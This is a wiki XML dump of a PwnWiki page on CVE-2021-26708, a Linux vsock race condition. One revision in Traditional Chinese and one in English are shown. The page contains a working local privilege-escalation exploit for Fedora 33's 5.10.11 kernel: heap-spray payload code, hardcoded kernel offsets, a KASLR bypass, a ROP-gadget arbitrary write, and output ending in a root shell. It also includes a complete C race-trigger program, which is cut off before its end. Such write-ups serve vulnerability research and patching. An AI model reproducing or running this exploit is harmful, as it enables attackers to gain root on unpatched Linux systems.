&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
==四字節的力量==
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
這裡我選擇Fedora 33 Server作為研究目標，內核版本為5.10.11-200.fc33.x86_64，並決心繞過SMEP和SMAP。
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
第一步，我開始研究穩定的堆噴射，該漏洞利用執行用戶空間的活動，使內核在釋放的virtio_vsock_sock的位置分配另一個64字節的對象。經過幾次實驗性嘗試後，確認釋放的virtio_vsock_sock被覆蓋，說明堆噴射是可行的。最終我找到了msgsnd() syscall。它在內核空間中創建了struct msg_msg，見pahole輸出：
&lt;/div&gt;
&lt;pre&gt;
struct msg_msg {
    struct list_head           m_list;               /*     0    16 */
    long int                   m_type;               /*    16     8 */
    size_t                     m_ts;                 /*    24     8 */
    struct msg_msgseg *        next;                 /*    32     8 */
    void *                     security;             /*    40     8 */

    /* size: 48, cachelines: 1, members: 5 */
    /* last cacheline: 48 bytes */
};
&lt;/pre&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
前面是消息頭，後面是消息數據。如果用戶空間中的struct msgbuf有一個16字節的mtext，則會在kmalloc-64塊緩存中創建相應的msg_msg。 4字節的write-after-free會破壞偏移量40的void *security指針。 msg_msg.security字段指向由lsm_msg_msg_alloc()分配的內核數據，當收到 msg_msg時，就會被security_msg_msg_free()釋放。因此，破壞security指針的前半部分，就能獲得 arbitrary free。
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
==內核信息洩露==
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
這裡使用了[https://www.pwnwiki.org/index.php?title=CVE-2019-18683_Linux_kernel_through_5.3.8_%E7%89%B9%E6%AC%8A%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E CVE-2019-18683]相同的技巧。虛擬套接字的第二個connect()調用&lt;code&gt;vsock_deassign_transport()&lt;/code&gt;，將&lt;code&gt;vsk-&gt;transport&lt;/code&gt;設置為NULL，使得&lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt;在內存崩潰後調用&lt;code&gt;virtio_transport_send_pkt_info()&lt;/code&gt;，出現內核告警：
&lt;/div&gt;
&lt;pre&gt;
WARNING: CPU: 1 PID: 6739 at net/vmw_vsock/virtio_transport_common.c:34
...
CPU: 1 PID: 6739 Comm: racer Tainted: G        W         5.10.11-200.fc33.x86_64 #1
Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.13.0-2.fc32 04/01/2014
RIP: 0010:virtio_transport_send_pkt_info+0x14d/0x180 [vmw_vsock_virtio_transport_common]
...
RSP: 0018:ffffc90000d07e10 EFLAGS: 00010246
RAX: 0000000000000000 RBX: ffff888103416ac0 RCX: ffff88811e845b80
RDX: 00000000ffffffff RSI: ffffc90000d07e58 RDI: ffff888103416ac0
RBP: 0000000000000000 R08: 00000000052008af R09: 0000000000000000
R10: 0000000000000126 R11: 0000000000000000 R12: 0000000000000008
R13: ffffc90000d07e58 R14: 0000000000000000 R15: ffff888103416ac0
FS:  00007f2f123d5640(0000) GS:ffff88817bd00000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00007f81ffc2a000 CR3: 000000011db96004 CR4: 0000000000370ee0
Call Trace:
  virtio_transport_notify_buffer_size+0x60/0x70 [vmw_vsock_virtio_transport_common]
  vsock_update_buffer_size+0x5f/0x70 [vsock]
  vsock_stream_setsockopt+0x128/0x270 [vsock]
...
&lt;/pre&gt;
&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
通過gdb調試，發現RCX寄存器包含了釋放的virtio_vsock_sock的內核地址，RBX寄存器包含了vsock_sock的內核地址。
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
==實現任意讀==
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
===從 arbitrary free 到 use-after-free===
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
從洩露的內核地址釋放一個對象
執行堆噴，用受控數據覆蓋該對象
使用損壞的對象進行權限升級
內核實現的System V消息有限制最大值DATALEN_MSG，即PAGE_SIZE減去sizeof(struct msg_msg))。如果你發送了更大的消息，剩餘的消息會被保存在消息段的列表中。 msg_msg中包含struct msg_msgseg *next用於指向第一個段，size_t m_ts用於存儲大小。當進行覆蓋操作時，就可以把受控的值放在msg_msg.m_ts和msg_msg.next中：
&lt;/div&gt;

[[File:T01a51dfe7a996e854c.png | 600px ]]


Payload:
&lt;pre&gt;
    #define PAYLOAD_SZ 40 
    void adapt_xattr_vs_sysv_msg_spray(unsigned long kaddr)
    {
        struct msg_msg *msg_ptr;

        xattr_addr = spray_data + PAGE_SIZE * 4 - PAYLOAD_SZ;

        /* Don't touch the second part to avoid breaking page fault delivery */
        memset(spray_data, 0xa5, PAGE_SIZE * 4);

        printf("[+] adapt the msg_msg spraying payload:\n");
        msg_ptr = (struct msg_msg *)xattr_addr;
        msg_ptr-&gt;m_type = 0x1337;
        msg_ptr-&gt;m_ts = ARB_READ_SZ;
        msg_ptr-&gt;next = (struct msg_msgseg *)kaddr; /* set the segment ptr for arbitrary read */
        printf("\tmsg_ptr %p\n\tm_type %lx at %p\n\tm_ts %zu at %p\n\tmsgseg next %p at %p\n",
               msg_ptr,
               msg_ptr-&gt;m_type, &amp;(msg_ptr-&gt;m_type),
               msg_ptr-&gt;m_ts, &amp;(msg_ptr-&gt;m_ts),
               msg_ptr-&gt;next, &amp;(msg_ptr-&gt;next));
    }
&lt;/pre&gt;
&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
但是如何使用msg_msg讀取內核數據呢？通過閱讀msgrcv()系統調用文檔，我找到了好解決方案，使用msgrcv()和MSG標誌：
&lt;/div&gt;
&lt;pre&gt;
MSG_COPY (since Linux 3.8)
        Nondestructively fetch a copy of the message at the ordinal position  in  the  queue
        specified by msgtyp (messages are considered to be numbered starting at 0).
&lt;/pre&gt;
&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
這個標誌使內核將消息數據複製到用戶空間，不從消息隊列中刪除。如果內核有CONFIG_CHECKPOINT_RESTORE=y，則MSG是可用的，在Fedora Server適用。
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
===任意讀的步驟===
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
準備工作：
使用sched_getaffinity()和CPU_COUNT()計算可用的CPU數量（該漏洞至少需要兩個）;
打開/dev/kmsg進行解析;
mmap()將spray_data內存區域配置userfaultfd()作為最後一部分;
啟動一個單獨的pthread來處理userfaultfd()事件;
啟動127個threads用於msg_msg上的setxattr()&amp;userfaultfd()堆噴射，並將它們掛在thread_barrier上;
獲取原始msg_msg的內核地址:
在虛擬套接字上進行條件競爭;
在第二個connect()後，在忙循環中等待35微秒;
調用msgsnd()來建立一個單獨的消息隊列；在內存破壞後，msg_msg對像被放置在virtio_vsock_sock位置;
解析內核日誌，從內核警告（RCX寄存器）中保存msg_msg的內核地址;
同時，從RBX寄存器中保存vsock_sock的內核地址;
使用損壞的 msg_msg對原始msg_msg執行任意釋放:
使用原始 msg_msg地址的4個字節作為 SO_VM_SOCKETS_BUFFER_SIZE，用於實現內存破壞；
在虛擬套接字上進行條件競爭；
在第二個connect()之後馬上調用msgsnd()；msg_msg被放置在virtio_vsock_sock的位置，實現破壞；
現在被破壞的msg_msg的security指針存儲原始msg_msg的地址(來自步驟2)；
&lt;/div&gt;

[[File:T01a2a2d47c9494c4a5.png | 600px ]]

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
如果在處理 msgsnd() 的過程中發生了來自 setsockopt()線程的 msg_msg.security內存損壞，進而SELinux權限檢查失敗；
在這種情況下，msgsnd()返回-1，損壞的msg_msg被銷毀；釋放msg_msg.security可以釋放原始msg_msg；
用一個可控的payload 覆蓋原始msg_msg：
msgsnd()失敗後，漏洞就會調用pthread_barrier_wait()，調用127個用於堆噴射的pthreads；
這些pthreads執行setxattr()的payload；
原始msg_msg被可控的數據覆蓋，msg_msg.next指針存儲vsock_sock對象的地址；
&lt;/div&gt;

[[File:T0140baae964febb059.png | 600px ]]

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
通過從存儲被覆蓋的 msg_msg的消息隊列中接收消息，將vsock_sock內核對象的內容讀到用戶空間：
&lt;/div&gt;
&lt;pre&gt;
ret = msgrcv(msg_locations[0].msq_id, kmem, ARB_READ_SZ, 0,
                IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
&lt;/pre&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
==尋找攻擊目標==
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
以下是我找到的點：
1.專用的塊緩存，如PINGv6和sock_inode_cache有很多指向對象的指針
2.struct mem_cgroup *sk_memcg指針在vsock_sock.sk偏移量664處。 mem_cgroup結構是在kmalloc-4k塊緩存中分配的。
3.const struct cred *owner指針在vsock_sock.sk偏移量840處，存儲了可以覆蓋進行權限升級的憑證的地址。
4.void (*sk_write_space)(struct sock *)函數指針在vsock_sock.sk偏移量688處，被設置為sock_def_write_space()內核函數的地址。它可以用來計算KASLR偏移量。
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
下面是該漏洞如何從內存中提取這些指針:
&lt;/div&gt;

&lt;pre&gt;
#define SK_MEMCG_RD_LOCATION    (DATALEN_MSG + SK_MEMCG_OFFSET)
#define OWNER_CRED_OFFSET    840
#define OWNER_CRED_RD_LOCATION    (DATALEN_MSG + OWNER_CRED_OFFSET)
#define SK_WRITE_SPACE_OFFSET    688
#define SK_WRITE_SPACE_RD_LOCATION (DATALEN_MSG + SK_WRITE_SPACE_OFFSET) 
/*
 * From Linux kernel 5.10.11-200.fc33.x86_64:
 *   function pointer for calculating KASLR secret
 */
#define SOCK_DEF_WRITE_SPACE    0xffffffff819851b0lu 
unsigned long sk_memcg = 0;
unsigned long owner_cred = 0;
unsigned long sock_def_write_space = 0;
unsigned long kaslr_offset = 0;

/* ... */

    sk_memcg = kmem[SK_MEMCG_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sk_memcg %lx (offset %ld in the leaked kmem)\n",
            sk_memcg, SK_MEMCG_RD_LOCATION);

    owner_cred = kmem[OWNER_CRED_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found owner cred %lx (offset %ld in the leaked kmem)\n",
            owner_cred, OWNER_CRED_RD_LOCATION);

    sock_def_write_space = kmem[SK_WRITE_SPACE_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sock_def_write_space %lx (offset %ld in the leaked kmem)\n",
            sock_def_write_space, SK_WRITE_SPACE_RD_LOCATION);

    kaslr_offset = sock_def_write_space - SOCK_DEF_WRITE_SPACE;
    printf("[+] Calculated kaslr offset: %lx\n", kaslr_offset);
&lt;/pre&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
==在 sk_buff 上實現 Use-after-free==
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
Linux內核中與網絡相關的緩衝區用struct sk_buff表示，這個對像中有skb_shared_info與destructor_arg，可以用於控制流劫持。網絡數據和skb_shared_info被放置在由sk_buff.head指向的同一個內核內存塊中。因此，在用戶空間中創建一個2800字節的網絡數據包會使skb_shared_info被分配到kmalloc-4k塊緩存中，mem_cgroup對像也是如此。
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
我構建了以下步驟：
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
1.使用socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)創建一個客戶端套接字和32個服務器套接字
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
2.在用戶空間中準備一個2800字節的緩衝區，並用0x42對其memset()
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
3.用sendto()將這個緩衝區從客戶端套接字發送到每個服務器套接字，用於在kmalloc-4k中創建sk_buff對象。在每個可用的CPU上使用`sched_setaffinity()
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
4.對vsock_sock執行任意讀取過程
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
5.計算可能的sk_buff內核地址為sk_memcg加4096(kmalloc-4k的下一個元素)
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
6.對這個可能的sk_buff地址執行任意讀
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
7.如果在網絡數據的位置找到0x42424242424242lu，則找到真正的sk_buff，進入步驟8。否則，在可能的sk_buff地址上加4096，轉到步驟6
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
8.sk_buff上執行32個pthreads的setxattr()&amp;userfaultfd()堆噴射，並把它們掛在pthread_barrier上
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
9.對sk_buff內核地址進行任意釋放
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
10.調用pthread_barrier_wait()，執行32個setxattr()覆蓋skb_shared_info的堆噴pthreads
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
11.使用recv()接收服務器套接字的網絡消息。
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
==通過skb_shared_info 進行任意寫==
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
以下是覆蓋sk_buff對象的有效payload：
&lt;/div&gt;

&lt;pre&gt;
#define SKB_SIZE        4096
#define SKB_SHINFO_OFFSET    3776
#define MY_UINFO_OFFSET        256
#define SKBTX_DEV_ZEROCOPY    (1 &lt;&lt; 3) 
void prepare_xattr_vs_skb_spray(void)
{
    struct skb_shared_info *info = NULL;

    xattr_addr = spray_data + PAGE_SIZE * 4 - SKB_SIZE + 4;

    /* Don't touch the second part to avoid breaking page fault delivery */
    memset(spray_data, 0x0, PAGE_SIZE * 4);

    info = (struct skb_shared_info *)(xattr_addr + SKB_SHINFO_OFFSET);
    info-&gt;tx_flags = SKBTX_DEV_ZEROCOPY;
    info-&gt;destructor_arg = uaf_write_value + MY_UINFO_OFFSET;

    uinfo_p = (struct ubuf_info *)(xattr_addr + MY_UINFO_OFFSET);
&lt;/pre&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
skb_shared_info駐留在噴射數據中，正好在偏移量SKB_SHINFO_OFFSET處，即3776字節。 skb_shared_info.destructor_arg指針存儲了struct ubuf_info的地址。因為被攻擊的sk_buff的內核地址是已知的，所以能在網絡緩衝區的MY_UINFO_OFFSET處創建了一個假的ubuf_info。下面是有效payload的佈局：
&lt;/div&gt;

[[File:T0185ccbf9f025c74da.png  | 600px]]

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
下面講講destructor_arg 回調:
&lt;/div&gt;
&lt;pre&gt;
 /*
     * A single ROP gadget for arbitrary write:
     *   mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rdx + rcx*8], rsi ; ret
     * Here rdi stores uinfo_p address, rcx is 0, rsi is 1
     */
    uinfo_p-&gt;callback = ARBITRARY_WRITE_GADGET + kaslr_offset;
    uinfo_p-&gt;desc = owner_cred + CRED_EUID_EGID_OFFSET; /* value for "qword ptr [rdi + 8]" */
    uinfo_p-&gt;desc = uinfo_p-&gt;desc - 1; /* rsi value 1 should not get into euid */
&lt;/pre&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
由於在vmlinuz-5.10.11-200.fc33.x86_64中找不到一個能滿足我需求的gadget，所以我自己進行了研究構造。
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
callback函數指針存儲一個ROP gadget 地址，RDI存儲callback函數的第一個參數，也就是ubuf_info本身的地址，RDI + 8指向ubuf_info.desc。 gadget 將ubuf_info.desc移動到RDX。現在RDX包含有效用戶ID和組ID的地址減一個字節。這個字節很重要：當gadget從 RSI向 RDX指向的內存中寫入消息1時，有效的 uid和 gid將被零覆蓋。重複同樣的過程，直到權限升級到root。整個過程輸出流如下：
&lt;/div&gt;
&lt;pre&gt;
[a13x@localhost ~]$ ./vsock_pwn

=================================================
==== CVE-2021-26708 PoC exploit by a13xp0p0v ====
=================================================

[+] begin as: uid=1000, euid=1000
[+] we have 2 CPUs for racing
[+] getting ready...
[+] remove old files for ftok()
[+] spray_data at 0x7f0d9111d000
[+] userfaultfd #1 is configured: start 0x7f0d91121000, len 0x1000
[+] fault_handler for uffd 38 is ready

[+] stage I: collect good msg_msg locations
[+] go racing, show wins: 
    save msg_msg ffff9125c25a4d00 in msq 11 in slot 0
    save msg_msg ffff9125c25a4640 in msq 12 in slot 1
    save msg_msg ffff9125c25a4780 in msq 22 in slot 2
    save msg_msg ffff9125c3668a40 in msq 78 in slot 3

[+] stage II: arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4d00
    kaddr for arb read: ffff9125c2035300
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c2035300 at 0x7f0d91120ff8
[+] go racing, show wins: 

[+] stage III: arbitrary read vsock via good overwritten msg_msg (msq 11)
[+] msgrcv returned 6096 bytes
[+] Found sk_memcg ffff9125c42f9000 (offset 4712 in the leaked kmem)
[+] Found owner cred ffff9125c3fd6e40 (offset 4888 in the leaked kmem)
[+] Found sock_def_write_space ffffffffab9851b0 (offset 4736 in the leaked kmem)
[+] Calculated kaslr offset: 2a000000

[+] stage IV: search sprayed skb near sk_memcg...
[+] checking possible skb location: ffff9125c42fa000
[+] stage IV part I: repeat arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4640
    kaddr for arb read: ffff9125c42fa030
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c42fa030 at 0x7f0d91120ff8
[+] go racing, show wins: 0 0 20 15 42 11 
[+] stage IV part II: arbitrary read skb via good overwritten msg_msg (msq 12)
[+] msgrcv returned 6096 bytes
[+] found a real skb

[+] stage V: try to do UAF on skb at ffff9125c42fa000
[+] skb payload:
    start at 0x7f0d91120004
    skb_shared_info at 0x7f0d91120ec4
    tx_flags 0x8
    destructor_arg 0xffff9125c42fa100
    callback 0xffffffffab64f6d4
    desc 0xffff9125c3fd6e53
[+] go racing, show wins: 15 

[+] stage VI: repeat UAF on skb at ffff9125c42fa000
[+] go racing, show wins: 0 12 13 15 3 12 4 16 17 18 9 47 5 12 13 9 13 19 9 10 13 15 12 13 15 17 30 

[+] finish as: uid=0, euid=0
[+] starting the root shell...
uid=0(root) gid=0(root) groups=0(root),1000(a13x) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
&lt;/pre&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
==視頻==
&lt;/div&gt;
&lt;youtube&gt;https://www.youtube.com/watch?v=EC8PFOYOUgU&lt;/youtube&gt;


&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
==參考==
&lt;/div&gt;
https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html</text>
      <sha1>9gzbpkwla3wtsgpv39ruix1deeo21pl</sha1>
    </revision>
    <revision>
      <id>2183</id>
      <parentid>2164</parentid>
      <timestamp>2021-05-04T03:34:52Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Vulnerability=="</comment>
      <origin>2183</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="26567" sha1="nvoxtj5n9idw2dcf2nodd0b7ixnutra" xml:space="preserve">&lt;languages  /&gt;
==Vulnerability==

These vulnerabilities are race conditions caused by incorrect locking in &lt;code&gt;net/vmw_vsock/af_vsock.c&lt;/code&gt;. These conditional competitions were implicitly introduced in the submission that added VSOCK multi-transport support in November 2019, and were merged into the Linux kernel 5.5-rc1 version.

&lt;code&gt;CONFIG_VSOCKETS&lt;/code&gt; and &lt;code&gt;CONFIG_VIRTIO_VSOCKETS&lt;/code&gt; are provided as kernel modules in all major GNU/Linux distributions. When you create a socket for the AF_VSOCK domain, these vulnerable modules are automatically loaded.
&lt;pre&gt;
vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
&lt;/pre&gt;

The creation of &lt;code&gt;AF_VSOCK&lt;/code&gt; sockets is available to non-privileged users and does not require user name space.


==Memory corruption==

The following is a detailed introduction to the use of CVE-2021-26708, using the conditional competition in &lt;code&gt;vsock_stream_etssockopt()&lt;/code&gt;. Two threads are required to reproduce. The first thread calls &lt;code&gt;setsockopt()&lt;/code&gt; :
&lt;pre&gt;
  setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
                &amp;size, sizeof(unsigned long));
&lt;/pre&gt;



The second thread changes the virtual socket transmission when &lt;code&gt;vsock_stream_etssockopt()&lt;/code&gt; tries to acquire the socket lock, by reconnecting the virtual socket:
&lt;pre&gt;
struct sockaddr_vm addr = {
        .svm_family = AF_VSOCK,
    };

    addr.svm_cid = VMADDR_CID_LOCAL;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

    addr.svm_cid = VMADDR_CID_HYPERVISOR;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));
&lt;/pre&gt;


In order to process the &lt;code&gt;connect()&lt;/code&gt; of the virtual socket, the kernel executes &lt;code&gt;vsock_stream_connect()&lt;/code&gt; which calls &lt;code&gt;vsock_assign_transport()&lt;/code&gt;. This function contains the following code:
&lt;pre&gt;
     if (vsk-&gt;transport) {
            if (vsk-&gt;transport == new_transport)
                return 0;

            /* transport-&gt;release() must be called with sock lock acquired.
             * This path can only be taken during vsock_stream_connect(),
             * where we have already held the sock lock.
             * In the other cases, this function is called on a new socket
             * which is not assigned to any transport.
             */
            vsk-&gt;transport-&gt;release(vsk);
            vsock_deassign_transport(vsk);
        }
&lt;/pre&gt;

&lt;code&gt;vsock_stream_connect()&lt;/code&gt; contains a socket lock, and &lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt; in the parallel thread also tries to obtain it, which constitutes a conditional competition. Therefore, when the second &lt;code&gt;connect()&lt;/code&gt; is performed with a different &lt;code&gt;svm_cid&lt;/code&gt;, the &lt;code&gt;vsock_deassign_transport()&lt;/code&gt; function is called. This function executes &lt;code&gt;virtio_transport_destruct()&lt;/code&gt;, releases &lt;code&gt;vsock_sock.trans&lt;/code&gt;, and &lt;code&gt;vsk-&gt;transport&lt;/code&gt; is set to NULL. When &lt;code&gt;vsock_stream_connect()&lt;/code&gt; releases the socket lock, &lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt; can continue to execute. It calls &lt;code&gt;vsock_update_buffer_size()&lt;/code&gt;, and then calls &lt;code&gt;transport-&gt;notify_buffer_size()&lt;/code&gt;. Here transport contains an outdated value from a local variable, which does not match &lt;code&gt;vsk-&gt;transport&lt;/code&gt; (the original value is set to NULL).

When the kernel executes &lt;code&gt;virtio_transport_notify_buffer_size()&lt;/code&gt;, memory corruption occurs:
&lt;pre&gt;
void virtio_transport_notify_buffer_size(struct vsock_sock *vsk, u64 *val)
{
    struct virtio_vsock_sock *vvs = vsk-&gt;trans;

    if (*val &gt; VIRTIO_VSOCK_MAX_BUF_SIZE)
        *val = VIRTIO_VSOCK_MAX_BUF_SIZE;

    vvs-&gt;buf_alloc = *val;

    virtio_transport_send_credit_update(vsk, VIRTIO_VSOCK_TYPE_STREAM, NULL);
}
&lt;/pre&gt;

Here, vvs is a pointer to the kernel memory, which has been released in &lt;code&gt;virtio_transport_destruct()&lt;/code&gt;. The size of &lt;code&gt;struct virtio_vsock_sock&lt;/code&gt; is 64 bytes and is located in the kmalloc-64 block cache. The buf_alloc field type is u32 and is located at offset 40. &lt;code&gt;VIRTIO_VSOCK_MAX_BUF_SIZE is 0xFFFFFFFFUL&lt;/code&gt;. The value of *val is controlled by the attacker, and its four least important bytes are written into the freed memory.


==Fuzzing==

The syzkaller fuzzer has no way to reproduce this crash, so I decided to study it myself. But why does the fuzzer fail? Observe &lt;code&gt;vsock_update_buffer_size()&lt;/code&gt; and find out:
&lt;pre&gt;
 if (val != vsk-&gt;buffer_size &amp;&amp;
      transport &amp;&amp; transport-&gt;notify_buffer_size)
        transport-&gt;notify_buffer_size(vsk, &amp;val);

    vsk-&gt;buffer_size = val;

&lt;/pre&gt;

Only when val is different from the current buffer_size, will &lt;code&gt;notify_buffer_size()&lt;/code&gt; be called, that is to say, when &lt;code&gt;setsockopt()&lt;/code&gt; executes &lt;code&gt;SO_VM_SOCKETS_BUFFER_SIZE&lt;/code&gt;, every time The size parameters of the call should all be different. So I built the relevant code:
&lt;pre&gt;
/*
 * AF_VSOCK vulnerability trigger.
 * It's a PoC just for fun.
 * Author: Alexander Popov &lt;alex.popov@linux.com&gt;.
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;pthread.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;linux/vm_sockets.h&gt;
#include &lt;unistd.h&gt;

#define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)

#define MAX_RACE_LAG_USEC 50

int vsock = -1;
int tfail = 0;
pthread_barrier_t barrier;

int thread_sync(long lag_nsec)
{
	int ret = -1;
	struct timespec ts0;
	struct timespec ts;
	long delta_nsec = 0;

	ret = pthread_barrier_wait(&amp;barrier);
	if (ret != 0 &amp;&amp; ret != PTHREAD_BARRIER_SERIAL_THREAD) {
		perror("[-] pthread_barrier_wait");
		return EXIT_FAILURE;
	}

	ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts0);
	if (ret != 0) {
		perror("[-] clock_gettime");
		return EXIT_FAILURE;
	}

	while (delta_nsec &lt; lag_nsec) {
		ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts);
		if (ret != 0) {
			perror("[-] clock_gettime");
			return EXIT_FAILURE;
		}

		delta_nsec = (ts.tv_sec - ts0.tv_sec) * 1000000000 +
						ts.tv_nsec - ts0.tv_nsec;
	}

	return EXIT_SUCCESS;
}

void *th_connect(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct sockaddr_vm addr = {
		.svm_family = AF_VSOCK,
	};

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	addr.svm_cid = VMADDR_CID_LOCAL;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	addr.svm_cid = VMADDR_CID_HYPERVISOR;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	return NULL;
}

void *th_setsockopt(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct timespec tp;
	unsigned long size = 0;

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	clock_gettime(CLOCK_MONOTONIC, &amp;tp);
	size = tp.tv_nsec;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
						&amp;size, sizeof(unsigned long));

	return NULL;
}

int main(void)
{
	int ret = -1;
	unsigned long size = 0;
	long loop = 0;
	pthread_t th[2] = { 0 };

	vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
	if (vsock == -1)
		err_exit("[-] open vsock");

	printf("[+] AF_VSOCK socket is opened\n");

	size = 1;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MIN_SIZE,
						&amp;size, sizeof(unsigned long));
	size = 0xfffffffffffffffdlu;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MAX_SIZE,
						&amp;size, sizeof(unsigned long));

	ret = pthread_barrier_init(&amp;barrier, NULL, 2);
	if (ret != 0)
		err_exit("[-] pthread_barrier_init");

	for (loop = 0; loop &lt; 30000; loop++) {
		long tmo1 = 0;
		long tmo2 = loop % MAX_RACE_LAG_USEC;

		printf("race loop %ld: tmo1 %ld, tmo2 %ld\n", loop, tmo1, tmo2);

		ret = pthread_create(&amp;th[0], NULL, th_connect, &amp;tmo1);
		if (ret != 0)
			err_exit("[-] pthread_create #0");

		ret = pthread_create(&amp;th[1], NULL, th_setsockopt, &amp;tmo2);
		if (ret != 0)
			err_exit("[-] pthread_create #1");

		ret = pthread_join(th[0], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #0");

		ret = pthread_join(th[1], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #1");

		if (tfail) {
			printf("[-] some thread got troubles\n");
			exit(EXIT_FAILURE);
		}
	}

	ret = close(vsock);
	if (ret)
		perror("[-] close");

	printf("[+] now see your warnings in the kernel log\n");
	return 0;
